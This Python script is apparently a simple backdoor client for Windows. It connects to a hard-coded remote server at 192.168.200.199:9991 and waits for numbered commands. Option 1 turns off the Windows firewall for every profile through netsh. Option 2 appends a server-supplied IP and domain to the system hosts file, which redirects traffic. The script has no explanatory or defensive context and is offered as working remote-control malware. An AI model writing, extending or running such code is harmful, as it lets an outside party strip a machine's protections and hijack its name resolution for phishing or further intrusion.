import socket
import os

server_ip = '192.168.200.199'
server_port = 9991

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((server_ip, server_port))

    # Continuously receive data from the server
    while True:
        # Receive data from the server
        data = s.recv(1024)

        # If no data is received, break out of the loop
        if not data:
            break

        # Decode the data and check if it is a valid menu option
        menu_choice = data.decode()
        if menu_choice not in ['1', '2']:
            print('Invalid input received')
            continue

        # If option 1 is selected, disable firewall
        if menu_choice == '1':
            os.system('cmd /c "netsh advfirewall set allprofiles state off"')

        # If option 2 is selected, receive redirect_ip and redirect_domain from server and add to hosts file
        elif menu_choice == '2':
            redirect_ip = s.recv(1024).decode()
            redirect_domain = s.recv(1024).decode()

            with open(os.path.join("C:\\Windows\\System32\\drivers\\etc\\hosts"), "a") as hosts_file:
                # Add the redirect entry to the hosts file
                hosts_file.write(f"\n{redirect_ip}    {redirect_domain}")

            print("Redirect entry added to hosts file")
